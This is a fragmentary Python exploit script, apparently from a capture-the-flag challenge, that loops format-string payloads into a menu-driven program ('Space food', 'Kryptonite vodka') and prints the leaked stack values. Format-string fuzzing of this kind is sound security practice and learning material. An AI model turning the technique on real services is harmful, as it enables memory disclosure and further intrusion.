...
def build_exploit_payload():
    for i in range(40):
        try:
            ...
            target.recv()
            target.sendlineafter(b"2. Space food\x0a", initial_payload)
            #target.recv()
            target.sendlineafter(b'3. Deathstar(70.00 s.rocks)\x0a', fuzz_payload)
            fmt_str_result= target.recvuntil(b'Enjoy your Kryptonite vodka!')
            ##Red or Green Kryptonite? 0x4002804df0 0x1d 0xc00 0x1999999999999999 Enjoy your Kryptonite vodka!
            print("Target {0}: {1}".format(i, fmt_str_result))
...
def exploit():
    ...
    target.recv()
#    target.sendlineafter("2. Drink something\x0a> ", initial_payload)
    target.sendlineafter("2. Space food\x0a ", initial_payload)
